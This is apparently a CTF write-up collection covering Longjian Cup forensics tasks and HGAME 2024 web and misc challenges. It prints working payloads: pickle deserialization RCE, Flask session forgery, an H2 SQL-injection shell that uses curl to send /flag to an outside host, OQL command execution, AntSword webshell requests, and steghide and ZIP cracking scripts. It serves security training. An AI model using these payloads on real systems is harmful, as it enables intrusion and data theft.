第二届陇剑杯初赛","uri":"/2023longjian_online/#wireshark_3"},{"categories":["Forensics"],"content":"\rWireshark_4 /etc/passwd中倒数第二个用户的用户名是？ flag{mysql} ","date":"2024-03-13","objectID":"/2023longjian_online/:5:4","series":null,"tags":["Forensics"],"title":"2023 第二届陇剑杯初赛","uri":"/2023longjian_online/#wireshark_4"},{"categories":["Forensics"],"content":"\rIncidentresponse","date":"2024-03-13","objectID":"/2023longjian_online/:6:0","series":null,"tags":["Forensics"],"title":"2023 第二届陇剑杯初赛","uri":"/2023longjian_online/#incidentresponse"},{"categories":["Forensics"],"content":"\rIncidentResponse_1 你是公司的一名安全运营工程师，今日接到外部监管部门通报，你公司网络出口存在请求挖矿域名的行为。需要立即整改。经过与网络组配合，你们定位到了请求挖矿域名的内网 IP 是 10.221.36.21。查询 CMDB 后得知该 IP 运行了公司的工时系统。（虚拟机账号密码为：root/IncidentResponsePasswd）挖矿程序所在路径是？（答案中如有空格均需去除，如有大写均需变为小写，使用 echo -n ‘strings’|md5sum|cut -d ’ ’ -f1 获取 md5 值作为答案） history没发现可疑信息，随后netstat -antpu，看到redis的不寻常端口 去这里看一下 redis.conf里有挖矿相关信息 echo -n '/etc/redis/redis-server'|md5sum|cut -d ' ' -f1 得到flag flag{6f72038a870f05cbf923633066e48881} ","date":"2024-03-13","objectID":"/2023longjian_online/:6:1","series":null,"tags":["Forensics"],"title":"2023 第二届陇剑杯初赛","uri":"/2023longjian_online/#incidentresponse_1"},{"categories":["Forensics"],"content":"\rIncidentResponse_2 挖矿程序连接的矿池域名是？ 题解见上题 flag{donate.v2.xmrig.com} ","date":"2024-03-13","objectID":"/2023longjian_online/:6:2","series":null,"tags":["Forensics"],"title":"2023 第二届陇剑杯初赛","uri":"/2023longjian_online/#incidentresponse_2"},{"categories":["Forensics"],"content":"\rIncidentResponse_3 攻击者入侵服务器的利用的方法是？（答案中如有空格均需去除，如有大写均需变为小写，使用echo -n ‘strings’|md5sum|cut -d ’ ’ -f1获取md5值作为答案） 根据历史命令，查看一下/home/app/nohup.log shiro反序列化 echo -n 'shirodeserialization'|md5sum|cut -d ' ' -f1 flag{3ee726cb32f87a15d22fe55fa04c4dcd} ","date":"2024-03-13","objectID":"/2023longjian_online/:6:3","series":null,"tags":["Forensics"],"title":"2023 第二届陇剑杯初赛","uri":"/2023longjian_online/#incidentresponse_3"},{"categories":["Forensics"],"content":"\rIncidentResponse_4 攻击者的IP是？（答案中如有空格均需去除，如有大写均需变为小写，使用echo -n ‘strings’|md5sum|cut -d ’ ’ -f1获取md5值作为答案） 根据nginx日志 cat /var/log/nginx/access.log echo -n '81.70.166.3'|md5sum|cut -d ' ' -f1 flag{c76b4b1a5e8c9e7751af4684c6a8b2c9} ","date":"2024-03-13","objectID":"/2023longjian_online/:6:4","series":null,"tags":["Forensics"],"title":"2023 第二届陇剑杯初赛","uri":"/2023longjian_online/#incidentresponse_4"},{"categories":["Forensics"],"content":"\rIncidentResponse_5 攻击者发起攻击时使用的User-Agent是？（答案中如有空格均需去除，如有大写均需变为小写，使用echo -n ‘strings’|md5sum|cut -d ’ ’ -f1获取md5值作为答案） 解法同上题 Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.110 Safari/537.36 echo -n 'mozilla/5.0(compatible;baiduspider/2.0;+http://www.baidu.com/search/spider.html)'|md5sum|cut -d ' ' -f1 flag{6ba8458f11f4044cce7a621c085bb3c6} ","date":"2024-03-13","objectID":"/2023longjian_online/:6:5","series":null,"tags":["Forensics"],"title":"2023 第二届陇剑杯初赛","uri":"/2023longjian_online/#incidentresponse_5"},{"categories":["Forensics"],"content":"\rIncidentResponse_6 攻击者使用了两种权限维持手段，相应的配置文件路径是？(md5加密后以a开头)（答案中如有空格均需去除，如有大写均需变为小写，使用echo -n ‘strings’|md5sum|cut -d ’ ’ -f1获取md5值作为答案） 第4篇：Linux权限维持–后门篇 应该是保存了authoriazed_keys的免密登录 /root/.ssh/authorized_keys echo -n '/root/.ssh/authorized_keys'|md5sum|cut -d ' ' -f1 flag{a1fa1b5aeb1f97340032971c342c4258} ","date":"2024-03-13","objectID":"/2023longjian_online/:6:6","series":null,"tags":["Forensics"],"title":"2023 第二届陇剑杯初赛","uri":"/2023longjian_online/#incidentresponse_6"},{"categories":["Forensics"],"content":"\rIncidentResponse_7 攻击者使用了两种权限维持手段，相应的配置文件路径是？(md5加密后以b开头)（答案中如有空格均需去除，如有大写均需变为小写，使用echo -n ‘strings’|md5sum|cut -d ’ ’ -f1获取md5值作为答案） 服务开机自动启动并且还是不间断的重启，那么可能是服务设置问题，寻找服务文件。发现服务文件在/lib/systemd/system/redis.service echo -n '/lib/systemd/system/redis.service'|md5sum|cut -d ' ' -f1 flag{b2c5af8ce08753894540331e5a947d35} ","date":"2024-03-13","objectID":"/2023longjian_online/:6:7","series":null,"tags":["Forensics"],"title":"2023 第二届陇剑杯初赛","uri":"/2023longjian_online/#incidentresponse_7"},{"categories":["Forensics"],"content":"\rSmallSword","date":"2024-03-13","objectID":"/2023longjian_online/:7:0","series":null,"tags":["Forensics"],"title":"2023 第二届陇剑杯初赛","uri":"/2023longjian_online/#smallsword"},{"categories":["Forensics"],"content":"\rSmallSword_1 连接蚁剑的正确密码是__?（答案示例：123asd） url解码之后得到 6ea280898e404bfabd0ebb702327b19f=@ini_set(\"display_errors\", \"0\");@set_time_limit(0);echo \"-\u003e|\";$D=dirname($_SERVER[\"SCRIPT_FILENAME\"]);if($D==\"\")$D=dirname($_SERVER[\"PATH_TRANSLATED\"]);$R=\"{$D} \";if(substr($D,0,1)!=\"/\"){foreach(range(\"A\",\"Z\")as $L)if(is_dir(\"{$L}:\"))$R.=\"{$L}:\";}else{$R.=\"/\";}$R.=\" \";$u=(function_exists(\"posix_getegid\"))?@posix_getpwuid(@posix_geteuid()):\"\";$s=($u)?$u[\"name\"]:@get_current_user();$R.=php_uname();$R.=\" {$s}\";echo $R;;echo \"|\u003c-\";die(); flag{6ea280898e404bfabd0ebb702327b19f} ","date":"2024-03-13","objectID":"/2023longjian_online/:7:1","series":null,"tags":["Forensics"],"title":"2023 第二届陇剑杯初赛","uri":"/2023longjian_online/#smallsword_1"},{"categories":["Forensics"],"content":"\rSmallSword_2 攻击者留存的值是__?(答案示例：d1c3f0d3-68bb-4d85-a337-fb97cf99ee2e) 对请求实体进行解码，得到： 0x72b3f341e432=RDovcGhwU3R1ZHkvUEhQVHV0b3JpYWwvV1dXL3NxbGlpL0xlc3MtNy9oYWNrZXIudHh0\u00260xe9bb136e8a5e9=YWQ2MjY5YjctM2NlMi00YWU4LWI5N2YtZjI1OTUxNWU3YTkxIA==\u00266ea280898e404bfabd0ebb702327b19f=@ini_set(\"display_errors\", \"0\");@set_time_limit(0);echo \"-\u003e|\";echo @fwrite(fopen(base64_decode($_POST[\"0x72b3f341e432\"]),\"w\"),base64_decode($_POST[\"0xe9bb136e8a5e9\"]))?\"1\":\"0\";;echo \"|\u003c-\";die(); YWQ2MjY5YjctM2NlMi00YWU4LWI5N2YtZjI1OTUxNWU3YTkxIA==base64解码得到flag flag{ad6269b7-3ce2-4ae8-b97f-f259515e7a91} (这题有点不明所以) ","date":"2024-03-13","objectID":"/2023longjian_online/:7:2","series":null,"tags":["Forensics"],"title":"2023 第二届陇剑杯初赛","uri":"/2023longjian_online/#smallsword_2"},{"categories":["Forensics"],"content":"\rSmallSword_3 攻击者下载到的flag是______________?(答案示例：flag3{uuid}) 把tcp130服务器应答的内容提取出来 根据文件头判断为exe文件，修改后缀名 放入云沙箱发现其释放了一个jpg文件 实际为png文件，进行宽高爆破后得到下部flag flag3{8f0dffac-5801-44a9-bd49-e66192ce4f57} ","date":"2024-03-13","objectID":"/2023longjian_online/:7:3","series":null,"tags":["Forensics"],"title":"2023 第二届陇剑杯初赛","uri":"/2023longjian_online/#smallsword_3"},{"categories":["Forensics"],"content":"\rtcpdump","date":"2024-03-13","objectID":"/2023longjian_online/:8:0","series":null,"tags":["Forensics"],"title":"2023 第二届陇剑杯初赛","uri":"/2023longjian_online/#tcpdump"},{"categories":["Forensics"],"content":"\rtcpdump_1 攻击者通过暴力破解进入了某 Wiki 文档，请给出登录的用户名与密码，以:拼接，比如 admin:admin 过滤器：http.request.method==POST and http.request.uri== login or http.response.code != 404 and frame.len != 237 username=TMjpxFGQwD\u0026password=123457 flag{TMjpxFGQwD:123457} ","date":"2024-03-13","objectID":"/2023longjian_online/:8:1","series":null,"tags":["Forensics"],"title":"2023 第二届陇剑杯初赛","uri":"/2023longjian_online/#tcpdump_1"},{"categories":["Forensics"],"content":"\rtcpdump_2 攻击者发现软件存在越权漏洞，请给出攻击者越权使用的cookie的内容的md5值。（32位小写） 刚登录时userid=2，后面变成1 accessToken=f412d3a0378d42439ee016b06ef3330c; zyplayertoken=f412d3a0378d42439ee016b06ef3330cQzw=; userid=1 flag{383c74db4e32513daaa1eeb1726d7255} ","date":"2024-03-13","objectID":"/2023longjian_online/:8:2","series":null,"tags":["Forensics"],"title":"2023 第二届陇剑杯初赛","uri":"/2023longjian_online/#tcpdump_2"},{"categories":["Forensics"],"content":"\rtcpdump_3 攻击使用 jdbc 漏洞读取了应用配置文件，给出配置中的数据库账号密码，以:拼接，比如 root:123456 flag{zyplayer:1234567} ","date":"2024-03-13","objectID":"/2023longjian_online/:8:3","series":null,"tags":["Forensics"],"title":"2023 第二届陇剑杯初赛","uri":"/2023longjian_online/#tcpdump_3"},{"categories":["Forensics"],"content":"\rtcpdump_4 攻击者又使用了 CVE 漏洞攻击应用，执行系统命令，请给出此 CVE 编号以及远程 EXP 的文件名，使用:拼接，比如 CVE-2020-19817:exp.so 根据tcp 16022流中的xml的信息能发现weblogic 搜索payload flag{CVE-2022-21724:custom.dtd.xml} ","date":"2024-03-13","objectID":"/2023longjian_online/:8:4","series":null,"tags":["Forensics"],"title":"2023 第二届陇剑杯初赛","uri":"/2023longjian_online/#tcpdump_4"},{"categories":["Forensics"],"content":"\rtcpdump_5 给出攻击者获取系统权限后，下载的工具的名称，比如 nmap flag{fscan} ","date":"2024-03-13","objectID":"/2023longjian_online/:8:5","series":null,"tags":["Forensics"],"title":"2023 第二届陇剑杯初赛","uri":"/2023longjian_online/#tcpdump_5"},{"categories":["Forensics"],"content":"\rHacked","date":"2024-03-13","objectID":"/2023longjian_online/:9:0","series":null,"tags":["Forensics"],"title":"2023 第二届陇剑杯初赛","uri":"/2023longjian_online/#hacked"},{"categories":["Forensics"],"content":"\rhacked_1 admIn 用户的密码是什么？ 根据该流的下一条tcp流http回显得知，该账号为admin账号 再根据之前的tcp流得知加密方式、密钥以及偏移量 赛博厨子解密 ","date":"2024-03-13","objectID":"/2023longjian_online/:9:1","series":null,"tags":["Forensics"],"title":"2023 第二届陇剑杯初赛","uri":"/2023longjian_online/#hacked_1"},{"categories":["Forensics"],"content":"\rhacked_2 app.config[‘SECRET_KEY’]值为多少？ flag{ssti_flask_hsfvaldb} ","date":"2024-03-13","objectID":"/2023longjian_online/:9:2","series":null,"tags":["Forensics"],"title":"2023 第二届陇剑杯初赛","uri":"/2023longjian_online/#hacked_2"},{"categories":["Forensics"],"content":"\rhacked_3 flask网站由哪个用户启动？ 使用flask-session-cookie-manager进行解密 对回显cookie进行解密 flag{red} ","date":"2024-03-13","objectID":"/2023longjian_online/:9:3","series":null,"tags":["Forensics"],"title":"2023 第二届陇剑杯初赛","uri":"/2023longjian_online/#hacked_3"},{"categories":["Forensics"],"content":"\rhacked_4 攻击者写入的内存马的路由名叫什么？（答案里不需要加/） 解密得到： flag{Index} ","date":"2024-03-13","objectID":"/2023longjian_online/:9:4","series":null,"tags":["Forensics"],"title":"2023 第二届陇剑杯初赛","uri":"/2023longjian_online/#hacked_4"},{"categories":["CTF","wp"],"content":"HGAME2024_week2_web\u0026misc ","date":"2024-02-14","objectID":"/hgame2024_week2/:0:0","series":null,"tags":["CTF","wp"],"title":"2024 HGAME_week2","uri":"/hgame2024_week2/#"},{"categories":["CTF","wp"],"content":"\rWeek2","date":"2024-02-14","objectID":"/hgame2024_week2/:0:0","series":null,"tags":["CTF","wp"],"title":"2024 HGAME_week2","uri":"/hgame2024_week2/#week2"},{"categories":["CTF","wp"],"content":"\rweb","date":"2024-02-14","objectID":"/hgame2024_week2/:1:0","series":null,"tags":["CTF","wp"],"title":"2024 HGAME_week2","uri":"/hgame2024_week2/#web"},{"categories":["CTF","wp"],"content":"\r[What the cow say?]除了反引号，$()也可以 `ls /` 直接用cat命令会被waf拦截 `tac /fla*/fla*` ","date":"2024-02-14","objectID":"/hgame2024_week2/:1:1","series":null,"tags":["CTF","wp"],"title":"2024 HGAME_week2","uri":"/hgame2024_week2/#what-the-cow-say"},{"categories":["CTF","wp"],"content":"\r[Select More Courses]登陆界面，使用top1000字典进行爆破 根据提示，应该是时间竞争 POST /api/expand HTTP/1.1 Host: 139.196.183.57:30232 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0 Accept: */* Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate, br Referer: http://139.196.183.57:30232/expand Content-Type: application/json Content-Length: 23 Origin: http://139.196.183.57:30232 Connection: close Cookie: session=MTcwODA2NzE4MXxEWDhFQVFMX2dBQUJFQUVRQUFBcV80QUFBUVp6ZEhKcGJtY01DZ0FJZFhObGNtNWhiV1VHYzNSeWFXNW5EQW9BQ0cxaE5XaHlNREJ0fIP0P43CugxLBJt9xdo6NEpISwrwf3-CXDctl9thdqyW {\"username\":\"ma5hr00m\"} payload类型选null并无限重复发包 再返回自主选课查看 ","date":"2024-02-14","objectID":"/hgame2024_week2/:1:2","series":null,"tags":["CTF","wp"],"title":"2024 HGAME_week2","uri":"/hgame2024_week2/#select-more-courses"},{"categories":["CTF","wp"],"content":"\r[myflask] import pickle import base64 from flask import Flask, session, request, send_file from datetime import datetime from pytz import timezone currentDateAndTime = datetime.now(timezone('Asia/Shanghai')) currentTime = currentDateAndTime.strftime(\"%H%M%S\") app = Flask(__name__) # Tips: Try to crack this first ↓ app.config['SECRET_KEY'] = currentTime print(currentTime) @app.route('/') def index(): session['username'] = 'guest' return send_file('app.py') @app.route('/flag', methods=['GET', 'POST']) def flag(): if not session: return 'There is no session available in your client :(' if request.method == 'GET': return 'You are {} now'.format(session['username']) # For POST requests from admin if session['username'] == 'admin': pickle_data=base64.b64decode(request.form.get('pickle_data')) # Tips: Here try to trigger RCE userdata=pickle.loads(pickle_data) return userdata else: return 'Access Denied' if __name__=='__main__': app.run(debug=True, host=\"0.0.0.0\") [flask中session的那些事](flask中session的那些事 (ctf.org.cn)) pickle—— Python 物件序列化 flask-session伪造 访问/flag 由以下代码可知，SECRET_KEY为6位数字 currentDateAndTime = datetime.now(timezone('Asia/Shanghai')) currentTime = currentDateAndTime.strftime(\"%H%M%S\") app = Flask(__name__) # Tips: Try to crack this first ↓ app.config['SECRET_KEY'] = currentTime 使用crunch生成6位数字字典 crunch 6 6 0123456789 -o ~/000000-999999.txt 爆破SECRET_KEY flask-unsign --unsign --cookie \"eyJ1c2VybmFtZSI6Imd1ZXN0In0.Zc8itA.-x96nzpnRAmc-tQCxN5uxYLhlQA\" --no-literal-eval --wordlist 000000-999999.txt 得到SECRET_KEY为165350并进行session伪造 flask-unsign --sign --cookie \"{'username': 'admin'}\" --secret 165350 --no-literal-eval 将cookie写入浏览器，访问/flag接口进行验证 pickle反序列化rce @app.route('/flag', methods=['GET', 'POST']) def flag(): ... ... # For POST requests from admin if session['username'] == 'admin': pickle_data=base64.b64decode(request.form.get('pickle_data')) # Tips: Here try to trigger RCE userdata=pickle.loads(pickle_data) return userdata ... 用POST方法请求/flag接口，程序使用pickle.dumps方法反序列化提交的pickle_data参数，并返回反序列化结果 构造__reduce__方法进行rce import pickle import base64 from urllib.parse import urlencode class myflaskrce: def __reduce__(self): return (open, ('/flag', 'r')) payload = base64.b64encode(pickle.dumps(myflaskrce())) post_params = {'pickle_data': payload} print(urlencode(post_params)) 执行脚本，得到payload pickle_data=gANjaW8Kb3BlbgpxAFgFAAAAL2ZsYWdxAVgBAAAAcnEChnEDUnEELg%3D%3D 随后发包 POST /flag HTTP/1.1 Host: 139.196.183.57:32139 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate, br Connection: close Cookie: session=eyJ1c2VybmFtZSI6ImFkbWluIn0.Zc8ulQ.hoc3E0E5-vcmVRCr9gVve05SKG4 Upgrade-Insecure-Requests: 1 Content-Type: application/x-www-form-urlencoded Content-Length: 0 pickle_data=gANjaW8Kb3BlbgpxAFgFAAAAL2ZsYWdxAVgBAAAAcnEChnEDUnEELg%3D%3D ","date":"2024-02-14","objectID":"/hgame2024_week2/:1:3","series":null,"tags":["CTF","wp"],"title":"2024 HGAME_week2","uri":"/hgame2024_week2/#myflask"},{"categories":["CTF","wp"],"content":"\r[search4member]sql注入–堆叠注入实现rce 尝试a' or 1=1 --+，得到表中所有数据 回显有三个字段。查询库名： a' union select 1,2,database() --+ Spring Boot Actuator H2 RCE漏洞复现 a'; CREATE ALIAS SHELL AS 'String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()); if (s.hasNext()) {return s.next();} throw new IllegalArgumentException();}';' rce，通过dnslog外带 https://requestrepo.com/ a';CALL SHELL('bash -c {echo,Y3VybCBgY2F0IC9mbGFnYC5kN3VobWE4ai5yZXF1ZXN0cmVwby5jb20=}|{base64,-d}|{bash,-i}');' ","date":"2024-02-14","objectID":"/hgame2024_week2/:1:4","series":null,"tags":["CTF","wp"],"title":"2024 HGAME_week2","uri":"/hgame2024_week2/#search4member"},{"categories":["CTF","wp"],"content":"\rmisc","date":"2024-02-14","objectID":"/hgame2024_week2/:2:0","series":null,"tags":["CTF","wp"],"title":"2024 HGAME_week2","uri":"/hgame2024_week2/#misc"},{"categories":["CTF","wp"],"content":"\r[ek1ng_want_girlfriend]\rhgame{ek1ng_want_girlfriend_qq_761042182} ","date":"2024-02-14","objectID":"/hgame2024_week2/:2:1","series":null,"tags":["CTF","wp"],"title":"2024 HGAME_week2","uri":"/hgame2024_week2/#ek1ng_want_girlfriend"},{"categories":["CTF","wp"],"content":"\r[ezWord]将docx文件后缀改为zip并解压 在\\attachment\\这是一个word文件\\word\\media文件发现提示 根据恭喜.txt推测为双图隐写 得到解压密码 T1hi3sI4sKey 解压后得到secret.txt文本 根据文本特征推测为垃圾邮件编码 https://www.spammimic.com/decode.shtml 得到文本 籱籰籪籶籮粄簹籴籨粂籸籾籨籼簹籵籿籮籨籪籵簺籨籽籱簼籨籼籮籬类簼籽粆 ROT-8000解码 Chiffre ROT8000 - Déchiffrer, Decoder, Encoder en Ligne (dcode.fr) ","date":"2024-02-14","objectID":"/hgame2024_week2/:2:2","series":null,"tags":["CTF","wp"],"title":"2024 HGAME_week2","uri":"/hgame2024_week2/#ezword"},{"categories":["CTF","wp"],"content":"\r[龙之舞]音频的频谱分析，发现可疑信息 进行反转和镜像 KEY:5H8w1nlWCX3hQLG 使用deepsound工具 提取出XXX.zip并解压，得到gif文件，会看到有二维码闪烁 对gif文件进行逐帧提取 拼合二维码 对二维码进行修复 ","date":"2024-02-14","objectID":"/hgame2024_week2/:2:3","series":null,"tags":["CTF","wp"],"title":"2024 HGAME_week2","uri":"/hgame2024_week2/#龙之舞"},{"categories":["CTF","wp"],"content":"HGAME2024_week1_web\u0026misc ","date":"2024-02-11","objectID":"/hgame2024_week1/:0:0","series":null,"tags":["CTF","wp"],"title":"2024 HGAME_week1","uri":"/hgame2024_week1/#"},{"categories":["CTF","wp"],"content":"\rWeek1","date":"2024-02-11","objectID":"/hgame2024_week1/:0:0","series":null,"tags":["CTF","wp"],"title":"2024 HGAME_week1","uri":"/hgame2024_week1/#week1"},{"categories":["CTF","wp"],"content":"\rweb","date":"2024-02-11","objectID":"/hgame2024_week1/:1:0","series":null,"tags":["CTF","wp"],"title":"2024 HGAME_week1","uri":"/hgame2024_week1/#web"},{"categories":["CTF","wp"],"content":"\r[ezHTTP]exp： GET / HTTP/1.1 Host: 47.100.245.185:31927 Referer: vidar.club X-Real-IP: 127.0.0.1 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Vidar; VidarOS x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate, br Accept-Language: zh-CN,zh;q=0.9,en;q=0.8 Connection: close 使用repeater发包后，解码响应的jwt得到flag 请从vidar.club登录： Referer: vidar.club 请使用Mozilla/5.0 (Vidar; VidarOS x86_64)......访问 User-Agent: Mozilla/5.0 (Vidar; VidarOS x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0 请从本地登录 X-Real-IP: 127.0.0.1 //X-Forwarded-For失效，或许黑名单了 ","date":"2024-02-11","objectID":"/hgame2024_week1/:1:1","series":null,"tags":["CTF","wp"],"title":"2024 HGAME_week1","uri":"/hgame2024_week1/#ezhttp"},{"categories":["CTF","wp"],"content":"\r[Bypass it]This page requires javascript to be enabled :) 开启js无法注册，将js禁用可成功注册，随后登录得到flag ","date":"2024-02-11","objectID":"/hgame2024_week1/:1:2","series":null,"tags":["CTF","wp"],"title":"2024 HGAME_week1","uri":"/hgame2024_week1/#bypass-it"},{"categories":["CTF","wp"],"content":"\r[Select Courses]对每个课程疯狂发包 exp: POST /api/courses HTTP/1.1 Host: 47.100.245.185:30640 Content-Length: 8 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36 Content-Type: application/json Accept: */* Origin: http://47.100.245.185:30640 Referer: http://47.100.245.185:30640/ Accept-Encoding: gzip, deflate, br Accept-Language: zh-CN,zh;q=0.9,en;q=0.8 Connection: close {\"id\":3} ","date":"2024-02-11","objectID":"/hgame2024_week1/:1:3","series":null,"tags":["CTF","wp"],"title":"2024 HGAME_week1","uri":"/hgame2024_week1/#select-courses"},{"categories":["CTF","wp"],"content":"\r[2048*16]\r解法1：base64换表在js里面发现两串疑似base编码的字符串 base64换表 解法2：js拦截修改参考： https://introvertedturtles.wordpress.com/2019/02/17/how-to-hack-2048-two-ways/ 拦截环境页面js之前先清除一下浏览器的js缓存 随后在bp设置中，把不拦截js规则取消 修改返回的js中关键代码，\u003c.9?2:4，2和4都修改为16384 var n=Math[x(494)]()\u003c.9?2:4,e=new j(this.grid[x(477)](),n); ","date":"2024-02-11","objectID":"/hgame2024_week1/:1:4","series":null,"tags":["CTF","wp"],"title":"2024 HGAME_week1","uri":"/hgame2024_week1/#204816"},{"categories":["CTF","wp"],"content":"\r[2048*16]\r解法1：base64换表在js里面发现两串疑似base编码的字符串 base64换表 解法2：js拦截修改参考： https://introvertedturtles.wordpress.com/2019/02/17/how-to-hack-2048-two-ways/ 拦截环境页面js之前先清除一下浏览器的js缓存 随后在bp设置中，把不拦截js规则取消 修改返回的js中关键代码，\u003c.9?2:4，2和4都修改为16384 var n=Math[x(494)]()\u003c.9?2:4,e=new j(this.grid[x(477)](),n); ","date":"2024-02-11","objectID":"/hgame2024_week1/:1:4","series":null,"tags":["CTF","wp"],"title":"2024 HGAME_week1","uri":"/hgame2024_week1/#解法1base64换表"},{"categories":["CTF","wp"],"content":"\r[2048*16]\r解法1：base64换表在js里面发现两串疑似base编码的字符串 base64换表 解法2：js拦截修改参考： https://introvertedturtles.wordpress.com/2019/02/17/how-to-hack-2048-two-ways/ 拦截环境页面js之前先清除一下浏览器的js缓存 随后在bp设置中，把不拦截js规则取消 修改返回的js中关键代码，\u003c.9?2:4，2和4都修改为16384 var n=Math[x(494)]()\u003c.9?2:4,e=new j(this.grid[x(477)](),n); ","date":"2024-02-11","objectID":"/hgame2024_week1/:1:4","series":null,"tags":["CTF","wp"],"title":"2024 HGAME_week1","uri":"/hgame2024_week1/#解法2js拦截修改"},{"categories":["CTF","wp"],"content":"\r[jhat]\rOQL(对象查询语言)在产品实现中造成的RCE(Object Injection) JVM 对象查询语言（OQL） new java.util.Scanner(java.lang.Runtime.getRuntime().exec('ls /').getInputStream()) new java.util.Scanner(java.lang.Runtime.getRuntime().exec('cat /flag').getInputStream()) ","date":"2024-02-11","objectID":"/hgame2024_week1/:1:5","series":null,"tags":["CTF","wp"],"title":"2024 HGAME_week1","uri":"/hgame2024_week1/#jhat"},{"categories":["CTF","wp"],"content":"\rmisc","date":"2024-02-11","objectID":"/hgame2024_week1/:2:0","series":null,"tags":["CTF","wp"],"title":"2024 HGAME_week1","uri":"/hgame2024_week1/#misc"},{"categories":["CTF","wp"],"content":"\r[Sign in]https://lab.magiconch.com/xzk/ 从底部平视或者用图像编辑软件自动校正一下 ","date":"2024-02-11","objectID":"/hgame2024_week1/:2:1","series":null,"tags":["CTF","wp"],"title":"2024 HGAME_week1","uri":"/hgame2024_week1/#sign-in"},{"categories":["CTF","wp"],"content":"\r[签到]\r","date":"2024-02-11","objectID":"/hgame2024_week1/:2:2","series":null,"tags":["CTF","wp"],"title":"2024 HGAME_week1","uri":"/hgame2024_week1/#签到"},{"categories":["CTF","wp"],"content":"\r[希尔希尔希尔]\r然后 发现key 同时 提取出来，是个压缩包，得到： 在线解密网站 https://ctf.bugku.com/tool/hill ","date":"2024-02-11","objectID":"/hgame2024_week1/:2:3","series":null,"tags":["CTF","wp"],"title":"2024 HGAME_week1","uri":"/hgame2024_week1/#希尔希尔希尔"},{"categories":["CTF","wp"],"content":"\r[simple_attack]压缩后的大小不同，但CRC冗余循环检验是一样的 明文攻击 工具：ARCHPR 4.54 工具：bkcrack https://cloud.tencent.com/developer/article/2215202 安装： 先从github获取资源，windows中安装bkcrack还需要额外安装VC++的Redistributable git clone https://github.com/kimci86/bkcrack.git 然后配置cmake工具，需要用到cmake手动构建brack的项目代码 pip install cmake 安装好后进入bkcrack文件夹内分别运行三段代码 cmake -S . -B build -DCMAKE_INSTALL_PREFIX=install cmake --build build --config Release cmake --build build --config Release --target install 进入install文件夹通过终端运行 使用： C:\\Users\\scofi\\Desktop\\bkcrack\\install\u003ebkcrack.exe -C Downloads.zip -c aa.png -P aa.zip -p aa.png 其中-C表示密文（cipher），-p为明文（plaintext） -C指外层文件，-c指内层文件 下一步 bkcrack.exe -C Downloads.zip -c aa.png -k e0be8d5d 70bb3140 7e983fff -d uncracked -d指定存文件的路径 随后 bkcrack -C attachment.zip -k key -U new.zip good -U表示更改密码，前面是新压缩包的名，后面是设置的密码 得到的txt文本进行base64 to file，base64-\u003e图片 ","date":"2024-02-11","objectID":"/hgame2024_week1/:2:4","series":null,"tags":["CTF","wp"],"title":"2024 HGAME_week1","uri":"/hgame2024_week1/#simple_attack"},{"categories":["CTF","wp"],"content":"\r[来自星辰的问候]\r根据提示，六位弱密码，通过steghide爆破 steghide info secret.jpg 生成一个6位数数字密码 crunch 6 6 0123456789 \u003e passwd.txt 然后通过shell脚本，进行steghide密码爆破 #bruteStegHide.sh #!/bin/bash for line in `cat $2`;do steghide extract -sf $1 -p $line \u003e /dev/null 2\u003e\u00261 if [[ $? -eq 0 ]];then echo 'password is: '$line exit fi done 随后 ./bruteStegHide.sh ../scofield/secret.jpg passwd.txt 得到密码123456 提取文件 steghide extract -sf secret.jpg -p 123456 解压压缩包，得到图片和一个离线网页 随后在网上搜索来自星尘这款游戏的字体 https://github.com/MY1L/Ctrl/releases 通过比对，得到flag ","date":"2024-02-11","objectID":"/hgame2024_week1/:2:5","series":null,"tags":["CTF","wp"],"title":"2024 HGAME_week1","uri":"/hgame2024_week1/#来自星辰的问候"},{"categories":["Forensics","wp"],"content":"赛后完整复现 检材一硬盘的 MD5 值为多少？ 80518bc0dbf3315f806e9edf7ee13c12 2. 检材一 bitlocker 的恢复密钥是多少？ 585805-292292-462539-352495-691284-509212-527219-095942 PasswareKitForensic 检材一镜像中用户最近一次打开的文件名是什么？ 列表.xlsx 检材一硬盘系统分区的起始位置？ 332398592 （火眼分析好像无法取物理位置） 检材一系统的版本号是多少（格式：x.x.x.x） 10.0.19042.508 检材一回收站中的文件被删除前的路径 C:\\Users\\rd\\Desktop\\iTunes(12.13.0.9).exe 检材一给出最后一次修改系统时间前的时间 2023-12-12 16:37:12 检材一最后一次远程连接本机的时间 2023-12-11 15:57:02 检材一 Chrome 浏览器最后一次搜索过的关键词是什么 常见的诈骗话术 2023 检材一是否连接过 U 盘，如有，请给出 U 盘的 SN 码 FC2005927F271 检材一 Edge 浏览器最早一次下载过的文件文件名是 winrar-x64-624scp.exe 嫌疑人访问的微博的密码的 MD5 值 5cb42860b3b61ef6dd361ad556f48e05 13、14、15、17. 检材二备份的设备名称是什么，检材二手机的 IOS 系统版本是多少，检材二备份的时间是多少，检材二使用过的号码 ICCID 是多少。 设备名称：“User” 的 iPhone IOS 系统版本：17.0 备份的时间是：2023-12-09 15:02:28 使用过的号码 ICCID 是：89860000191997734908 嫌疑人 iphone 手机给号码 “13502409024” 最后一次打电话的时间是。 